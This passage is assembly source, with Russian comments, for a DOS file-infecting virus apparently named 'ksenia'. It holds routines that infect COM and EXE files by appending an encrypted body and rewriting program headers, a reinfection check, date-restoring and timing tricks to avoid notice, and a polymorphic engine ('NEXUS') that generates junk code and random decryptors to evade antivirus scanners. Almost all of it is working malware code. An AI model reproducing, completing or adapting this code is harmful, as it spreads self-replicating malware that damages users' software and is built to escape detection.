        rcr     ax,1
        jnc     NoCRC
        xor     ax,08320h
        xor     bx,0edb8h
   NoCRC:
        dec     dh
        jnz     NextBitCRC
        xor     ecx,eax
        xor     edx,ebx
        dec     di
        jnz     NextByteCRC
        not     edx
        not     ecx
        mov     eax,edx
        rol     eax,16
        mov     ax,cx
        pop     ds edi esi edx ecx ebx
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; инфицирование handle
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 Infect_Handle:
        push    cs cs           ; ds и es показывают на нас
        pop     ds es
        call    HandleCheck     ; проверка файла на фиктивность (disk file?)
        jc      close

        call    Inf_Check       ; проверка файла на повторное заражение
        jc      close

        mov     cx,32           ; чтение заголовка файла
        lea     dx,original
        call    read
        cmp     cx,ax           ; DOS вернул все запрошенные для
        jne     close           ; чтения байты?

        lea     si,original     ; сделать копию оригинального
        lea     di,header       ; начала программы
        mov     cx,32
        cld
        rep     movsb

        lea     di,header
        mov     ax,[di]         ; взять в ax первые 2 байта заголовка
        cmp     ax,'ZM'         ; проверка на EXE тип
        je      exeinfect
        cmp     ax,'MZ'         ; таких EXEшников я никогда не видел
        je      exeinfect       ; но говорят такие бывают

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; инфицирование COM файла
; DI - заголовок, который нужно модифицировать
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
        call    seek2eof        ; получение размера файла
        or      dx,dx           ; размер файла больше 65535 байт?
        jnz     Close
        cmp     ax,65035-vsize  ; проверка файла на переполнение
        ja      Close           ; место еще оставлено под стек и PSP
        mov     B [di],0e9h     ; запись JMP
        mov     delta,ax        ; дополнительное смещение для полиморфа
        sub     ax,3            ; коррекция (минус размер jump'а)
        mov     W [di+1],ax     ; запись адреса перехода
        jmp     check

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; инфицирование EXE файла
; DI - заголовок, который нужно модифицировать
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 exeinfect:
        cmp     B [di+18h],'@'  ; проверка файла на принадлежность
        je      Close           ; к новому семейству WinNE файлов

        mov     ax,W [di+4]     ; считать параметр PageCnt
        mov     cx,W [di+2]     ; считать параметр PartPag
        or      cx,cx           ; если длина последней страницы равна
        jz      $+3             ; нулю, то параметр PageCnt не содержит
        dec     ax              ; дополнительной единицы
        mov     dx,512          ; умножение на 512 (получение байт)
        mul     dx
        add     ax,cx           ; получение длины из EXE файла, которая
        adc     dx,0            ; грузится в память при запуске это EXE

        push    dx ax           ; сохранить пареметр в стеке
        call    seek2eof        ; получение дискового размера файла
        pop     si cx           ; загрузка параметров из стека
        cmp     si,ax           ; сравнение параметров (выявление
        jnz     Close           ; всяких overlay структур)
        cmp     cx,dx
        jnz     Close           ; очень большие файлы нам не подходят
        cmp     dx,10           ; как они в память грузяться??? но такие
        jae     Close           ; бывают (случается divide overflow ниже)

        push    ax dx           ; сохранение параметров
        mov     cx,16           ; получение входной точки (CS:IP), которые
        div     cx              ; расположены в конце чистого EXE файла
        sub     ax,[di+8]       ; вычитание размера EXE заголовка
        mov     delta,dx        ; дополнительное смещение для полиморфа
        sub     ax,10h          ; подобие COM файлу (IP больше/равно 100h)
        add     dx,100h
        mov     W [di+14h],dx   ; сохранение IP
        mov     W [di+16h],ax   ; сохранение CS
        mov     W [di+0eh],ax   ; сохранение SS (ой TBSCAN заорет)
        mov     W [di+10h],-2   ; сохранение SP
        pop     dx ax           ; загрузка параметров из стека

        add     ax,vsize        ; добавление к размеру файла
        adc     dx,0            ; длины вируса
        mov     cx,512          ; считаем новые PartPag и PageCnt для
        div     cx              ; файла вместе с вирусом
        or      dx,dx
        jz      $+3
        inc     ax
        mov     [di+2],dx       ; сохранение PartPag
        mov     [di+4],ax       ; сохранение PageCnt

 Check: call    WriteVirus      ; запись вирус в файл

 Close: call    CorrectDate     ; правка даты инфицированного файла
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; запись зашифрованного тела вируса в файл
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 writevirus:
        call    GetDate         ; запрос времени/даты файла

        cmp     cs:save_ax,1857h; проверка необходимости порверки
        jz      no_time         ; времени файла

        mov     ah,2ch          ; запрос текущего времени
        call    int21           ; в dx:cx
        mov     ax,cs:time      ; в ax время файла
        shr     ah,3            ; берем часы (биты 11-15 в cx)
        cmp     ah,ch           ; совпадают? если да, то съябываемся,
        je      write_fail      ; чтобы не засветиться
 no_time:
        call    seek2eof        ; -> конец
        call    nexus
        call    write           ; записываемся в файл
        xor     cx,ax           ; все записалось?
        jnz     write_fail

        call    seek2bof        ; идем в начало
        mov     cx,32           ; заголовок com/exe файла
        lea     dx,header
        call    write

  write_fail:
        call    RestDate        ; восстановление даты файла
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; проверка файла на инфицированность
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 Inf_Check:
       call    SaveRegs         ; сохранить в стеке регистры

       call    SeekSave         ; сохраняем позицию lseek
       mov     cx,-1            ; переносим указатель на начало
       mov     dx,-vsize        ; тела вируса
       call    seekfrom_eof

       mov     cx,vsize         ; читаем дескриптор в буфер
       lea     dx,buffer
       push    cs cs
       pop     ds es
       call    read

       call    RestoreSeek      ; восстановить позицию lseek
       xor     cx,ax            ; все прочиталось?
       jnz     not_infected

       lea     si,v_id
       lea     di,[buffer+(signature-ksenia)]
       mov     cx,ssize
       cld
       repe    cmpsb
       jnz     not_infected

       call    LoadRegs
       stc
       ret

 not_infected:
       call    LoadRegs
       clc
       ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; CRLOAD - подпрограмма для получения оригинального начала
; зараженной программы из зашифрованного вируса в этой программе
; вход: BX - handle инфицированной программы
; выход: "buffer" содержит 32 оригинальных байта
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 crload:
        call    SaveRegs        ; сохранение регистров
        push    cs cs           ; инициализация сегментных регистров
        pop     ds es

        xor     cx,cx           ; сохранение позиции указателя в файле
        xor     dx,dx
        call    seekfrom_cur
        push    dx ax

        mov     cx,-1           ; идем к голове вируса (т.к. вирус записан
        mov     dx,-vsize       ; в конце программы, его начало будет распо-
        call    seekfrom_eof    ; ложено на VSIZE байт от конца файла)

        mov     cx,vsize        ; читаем зашифрованный вирус
        lea     dx,buffer       ; в буфер
        call    read

        pop     dx cx           ; восстанавливаем позицию указателя
        call    seekfrom_bof

        mov     si,w [buffer+(nex_ptr-ksenia)]
        mov     ax,[si+1]       ; чтение расшифровщика
        and     ah,not 111b
        or      ah,101b         ; расшифровка с регистром DI
        mov     w do_enc,ax
        test    al,10b          ; проверка необходимости ключа
        mov     al,[si+3]       ; чтение ключа
        jz      _key
        mov     al,90h
 _key:  mov     B do_enc+2,al
        mov     B do_enc+3,0c3h ; сохранение команды RET в ячейке

        mov     cx,32           ; подготовка к расшифровке
        lea     si,[buffer+(original-ksenia)]
        lea     di,buffer

 crge:  lodsb                   ; чтение байта
        mov     [di],al         ; сохранение байта
        call    near ptr do_enc ; расшифровка байта
        inc     di              ; далее
        loop    crge

        call    LoadRegs        ; восстановление регистров
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Polymorphic engine [NEXUS]
; "DELTA" = delta offset in file
; OUT - CX = virus size
; OUT - DX = polymorph code
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 nexus: call    SaveRegs        ; инициализация
        push    cs cs
        pop     ds es
        cld
        lea     di,buffer

        mov     w r_used,-1     ; ни один из регистров не используется
        call    garbage         ; генерация мусора

        mov     wflag,2         ; get random count register
        call    get_reg
        mov     r_used,al
        or      al,10111000b    ; create MOV opcode
        stosb                   ; save it
        mov     ax,vsize-crlen
        stosw
        call    garbage         ; put some garbage

 get_idx:
        call    get_reg         ; get random index register (BX DI SI)
        mov     ah,111b         ; check if BX register
        cmp     al,011b
        je      got_idx
        mov     ah,100b         ; check if SI register
        cmp     al,110b
        je      got_idx
        mov     ah,101b         ; check if DI register
        cmp     al,111b
        jne     get_idx
 got_idx:
        mov     r_used +1,al
        mov     rm_field,ah
        or      al,10111000b       ; create MOV opcode
        stosb                      ; save it
        mov     offs_ptr,di        ; save ptr to the offset
        mov     ax,?
        stosw
        call    garbage            ; put some garbage

 bad_crypt:
        mov     cr_ptr,di
        mov     ax,ctotal          ; choose random encryptor
        lea     si,crins
        call    get_rnd
        imul    ax,(cp2n-crins)
        add     si,ax
        mov     ax,W [si]         ; read encrypt opcode
        or      ah,101b           ; encrypt with DI
        mov     W do_enc,ax
        mov     ax,0ffh           ; get any random value
        call    get_rnd
        inc     ax
        test    B do_enc,10b      ; проверка необходимости ключа
        jz      stos_it
        mov     al,90h
 stos_it:
        mov     do_enc+2,al
        mov     B do_enc+3,0c3h   ; сохранение команды RET в ячейке
        mov     al,[di]           ; check if it realy crypts byte
        call    near ptr do_enc
        cmp     al,[di]
        mov     [di],al
        jz      bad_crypt

        mov     al,2eh
        stosb
        mov     ax,W [si+2]       ; read decrypt opcode
        or      ah,rm_field       ; update opcode
        stosw
        test    al,10b            ; проверка необходимости ключа
        jnz     no_stos
        mov     al,do_enc+2
        stosb
 no_stos:
        call    garbage            ; put some garbage

        mov     al,01000000b       ; update index register
        or      al,r_used +1
        stosb
        call    garbage            ; put some garbage
        mov     al,01001000b       ; update count register
        or      al,r_used
        stosb
        mov     al,01110101b       ; jnz
        stosb
        mov     ax,cr_ptr
        sub     ax,di
        dec     ax
        stosb

        mov     si,di
        sub     si,offset buffer
        mov     ax,crlen
        sub     ax,si
        call    fixedfill          ; put AX bytes of the garbage

        mov     ax,di              ; calculate decryptor size
        sub     ax,offset buffer-100h
        add     ax,delta
        mov     si,offs_ptr
        mov     [si],ax

; copy virus body to the buffer and encrypt it "on the fly"
        mov     cx,shield-ksenia-crlen
        lea     si,ksenia+crlen
        lea     di,buffer+crlen
        rep     movsb
        mov     cx,original-shield-1
 dupcr: lodsb
        sub     al,[si]
        stosb
        loop    dupcr
        mov     cx,eov-original+1
        rep     movsb

; polymorph it!
        mov     cx,vsize-crlen
        lea     di,buffer+crlen
 _encr: call    near ptr do_enc
        inc     di
        loop    _encr

        lea     si,v_id
        lea     di,[buffer+(signature-ksenia)]
        mov     cx,ssize
        rep     movsb
        mov     ax,cr_ptr
        mov     w [buffer+(nex_ptr-ksenia)],ax

        call    LoadRegs
        mov     cx,vsize
        lea     dx,buffer
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; подпрограмма для генерации мусорного кода на базе таблицы
; в качестве входных параметров установить ES:DI на буфер для результата
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 maxg   equ     crlen/7         ; maximum number of garbage bytes
 fixedfill:                     ; fixed number of garbage bytes (AX)
        call    SaveRegs
        jmp     fill
 garbage:
        call    SaveRegs
        mov     ax,maxg         ; getting random number of garbage
        call    get_rnd         ; instructions
 fill:  mov     cx,ax           ; exit on CX=0
        or      cx,cx
        jz      garb_ret

 gloop: push    cx di
        lea     si,opcz         ; SI -> our table with opcodes and offsets
        mov     ax,total        ; get random number of instruction
        call    get_rnd
        imul    ax,op2n-opcz    ; get relative offset ()
        add     si,ax
        mov     dx,[si]         ; read instruction opcode
        xchg    dl,dh

        mov     wflag,0         ; no W field means
        cmp     B [si+2],0ffh   ; check if W field required
        jz      no_W

        mov     ax,2            ; get 0 or 1 (B/W)
        call    get_rnd
        mov     wflag,ax        ; set value to number of required random
        inc     wflag           ; bytes after instruction
        mov     cl,B [si+2]     ; read W-bit number
        shl     ax,cl           ; set it up
        or      dx,ax           ; update opcode

 no_W:  cmp     B [si+3],0ffh   ; check if REG field required
        jz      no_R
        call    get_reg         ; get random register number (REG)
        mov     cl,B [si+3]     ; read REG bit number
        shl     ax,cl
        or      dx,ax           ; update opcode

 no_R:  xchg    ax,dx           ; store instruction
        xchg    al,ah           ; if instruction the same with the previous

        cmp     al,0feh
        jae     no_store
        stosb
        cmp     si,offset onebyte
        jae     imm8
        xchg    al,ah
        stosb

 imm8:  mov     cx,wflag       ; get number of random
        jcxz    no_store       ; bytes after instruction
 rndb:  mov     ax,100h
        call    get_rnd
        stosb
        loop    rndb
 no_store:
        pop     ax cx
        sub     ax,di
        neg     ax              ; number of bytes of the instruction
        sub     cx,ax
        ja      gloop
        jz      garb_ret
        add     cx,ax
        sub     di,ax
        jmp     gloop

 garb_ret:
        mov     wflag,di
        call    LoadRegs
        mov     di,wflag
        ret

; gets random REG field into al without [r_used ]
 get_reg:
        mov     ax,8            ; get random value
        call    get_rnd
        mov     ah,al

        cmp     wflag,1         ; check REG
        jnz     r16
        and     ah,11111011b    ; 8-bit regs
        jmp     allbits

 r16:   cmp     ah,100b         ; check for SP REG
        jz      get_reg
 allbits:
        cmp     r_used,ah       ; 16-bit regs
        jz      get_reg
        cmp     r_used+1,ah
        jz      get_reg
        cbw
        ret

; encryptors    FEDCBA98  76543210
; dectyptors    ||||||||  ||||||||
 crins  label   byte
        db      10000000b,00110000b       ; XOR
        db      10000000b,00110000b       ; XOR

 cp2n   db      10000000b,00000000b       ; ADD
        db      10000000b,00101000b       ; SUB

        db      10000000b,00101000b       ; SUB
        db      10000000b,00000000b       ; ADD

        db      11000000b,00001000b       ; ROR
        db      11000000b,00000000b       ; ROL

        db      11000000b,00000000b       ; ROL
        db      11000000b,00001000b       ; ROR

        db      11110110b,00010000b       ; NOT
        db      11110110b,00010000b       ; NOT

        db      11110110b,00011000b       ; NEG
        db      11110110b,00011000b       ; NEG

        db      11111110b,00000000b       ; INC
        db      11111110b,00001000b       ; DEC

        db      11111110b,00001000b       ; DEC
        db      11111110b,00000000b       ; INC
 ctotal equ     ($-crins)/(cp2n-crins)

; opcodes       FEDCBA98  76543210
; table         ||||||||  ||||||||
 opcz   db      11000110b,11000000b       ; opcode   (MOVL)
        db      8                         ; W field ptr (FF if none)
        db      02h-2                     ; "reg" bit ptr (FF if none)
 op2n   db      10000000b,11000000b       ; opcode   (ADD)
        db      8                         ; W field ptr (FF if none)
        db      02h-2                     ; "reg" bit ptr (FF if none)
        db      10000000b,11101000b       ; opcode   (SUB)
        db      8                         ; W field ptr (FF if none)
        db      02h-2                     ; "reg" bit ptr (FF if none)
        db      10000000b,11111000b       ; opcode   (CMP)
        db      8                         ; W field ptr (FF if none)
        db      02h-2                     ; "reg" bit ptr (FF if none)
        db      11110111b,11011000b       ; opcode   (NEG16)
        db      0ffh                      ; W field ptr (FF if none)
        db      02h-2                     ; "reg" bit ptr (FF if none)
        db      11110111b,11010000b       ; opcode   (NOT16)
        db      0ffh                      ; W field ptr (FF if none)
        db      02h-2                     ; "reg" bit ptr (FF if none)
        db      10000000b,11100000b       ; opcode   (AND)
        db      8                         ; W field ptr (FF if none)
        db      02h-2                     ; "reg" bit ptr (FF if none)
        db      11110110b,11000000b       ; opcode   (TEST)
        db      8                         ; W field ptr (FF if none)
        db      02h-2                     ; "reg" bit ptr (FF if none)
        db      10000000b,11001000b       ; opcode   (OR)
        db      8                         ; W field ptr (FF if none)
        db      02h-2                     ; "reg" bit ptr (FF if none)
        db      10000000b,11110000b       ; opcode   (XOR)
        db      8                         ; W field ptr (FF if none)
        db      02h-2                     ; "reg" bit ptr (FF if none)
        db      10000000b,11011000b       ; opcode   (SBB)
        db      8                         ; W field ptr (FF if none)
        db      02h-2                     ; "reg" bit ptr (FF if none)
        db      10000000b,11010000b       ; opcode   (ADC)
        db      8                         ; W field ptr (FF if none)
        db      02h-2                     ; "reg" bit ptr (FF if none)
        db      11001101b,00000001b       ; opcode   (INT 01)
        db      0ffh                      ; W field ptr (FF if none)
        db      0ffh                      ; "reg" bit ptr (FF if none)
        db      11001101b,00000011b       ; opcode   (INT 03)
        db      0ffh                      ; W field ptr (FF if none)
        db      0ffh                      ; "reg" bit ptr (FF if none)
        db      01110000b,0               ; opcode   (Jxx $+2)
        db      0ffh                      ; W field ptr (FF if none)
        db      0ah-2                     ; "reg" bit ptr (FF if none)
        db      01111000b,0               ; opcode   (Jxx $+2)
        db      0ffh                      ; W field ptr (FF if none)
        db      0ah-2                     ; "reg" bit ptr (FF if none)
        db      11100011b,0               ; opcode   (Jcxz $+2)
        db      0ffh                      ; W field ptr (FF if none)
        db      0ffh                      ; "reg" bit ptr (FF if none)
        db      11101011b,0               ; opcode   (Jmp short $+2)
        db      0ffh                      ; W field ptr (FF if none)
        db      0ffh                      ; "reg" bit ptr (FF if none)
 onebyte:       ; - One-byte instructions
        db      10110000b,0               ; opcode   (MOV)
        db      0bh                       ; W field ptr (FF if none)
        db      0ah-2                     ; "reg" bit ptr (FF if none)
        db      01000000b,0               ; opcode   (INC)
        db      0ffh                      ; W field ptr (FF if none)
        db      0Ah-2                     ; "reg" bit ptr (FF if none)
        db      01001000b,0               ; opcode   (DEC)
        db      0ffh                      ; W field ptr (FF if none)
        db      0Ah-2                     ; "reg" bit ptr (FF if none)
        db      11001100b,0               ; opcode   (int3)
        db      0ffh                      ; W field ptr (FF if none)
        db      0ffh                      ; "reg" bit ptr (FF if none)
        db      11111000b,0               ; opcode   (S/Cf)
        db      0ffh                      ; W field ptr (FF if none)
        db      0ah-2                     ; "reg" bit ptr (FF if none)
 total  equ     ($-opcz)/(op2n-opcz)

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; конец подсчета CRC
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 end_crc:

 random1                dw      0         ; пара случайных чисел
 random2                dw      0
 checksum               dd      0f90738adh; CRC32 вируса

 epb                    dw      0         ; Execute Parameter Block
                        dw      80h       ; командная строка
 seg0                   dw      0
                        dw      5ch       ; FCB#1
 seg1                   dw      0
                        dw      6ch       ; FCB#2
 seg2                   dw      0
 original               db      0c3h,31 dup (0)

 nex_ptr                dw      0         ; указатель на расшифровщик
 signature              db      ssize dup (0)

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; область недисковых данных - конец файловой части вируса
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 eov:

 io08                   dw      ?,?       ; ячейки хранения векторов
 io21p                  dw      ?,?       ; прерываний
 io24                   dw      ?,?
 stf                    db      ?         ; режим стелс (mcbcheck)
 command                db      ?         ; command.com (mcbcheck)
 seek_pos               dw      ?,?       ; позиция указателя (SeekSave)
 nrbytes                dw      ?         ; прочитанные байты (ReadStealth)
 rm_field               db      ?         ; хранение R/M поля индекса (NEXUS)
 r_used                 db      ?,?       ; 2 используемых регистра (NEXUS)
 offs_ptr               dw      ?         ; (NEXUS)
 cr_ptr                 dw      ?         ; (NEXUS)
 wflag                  dw      ?         ; флаг W опкода (NEXUS)
 do_enc                 db      ?,?,?,?   ; опкод-буфер (NEXUS/CRLOAD)
 fn_ptr                 dw      ?,?       ; имя файла (ClrAttrib)
 attrib                 dw      ?         ; аттрибуты (ClrAttrib)
 time                   dw      ?         ; время файла (GetDate)
 date                   dw      ?         ; дата файла (GetDate)
 delta                  dw      ?         ; +смещение (входной параметр NEXUS)
 w95state               dw      ?         ; состояние Win95 (точнее WinOldAp)
 save_ax                dw      ?         ; передача параметров менеджера
 save_bx                dw      ?         ; резидентной части обработчикам
 save_es                dw      ?         ;
 delay                  db      ?         ; счетчик для Virus Guard

 header                 db      32 dup (?)
 buffer                 db      vsize dup (?)
 stacks                 db      100h dup (?)

 eom:                   end     ksenia
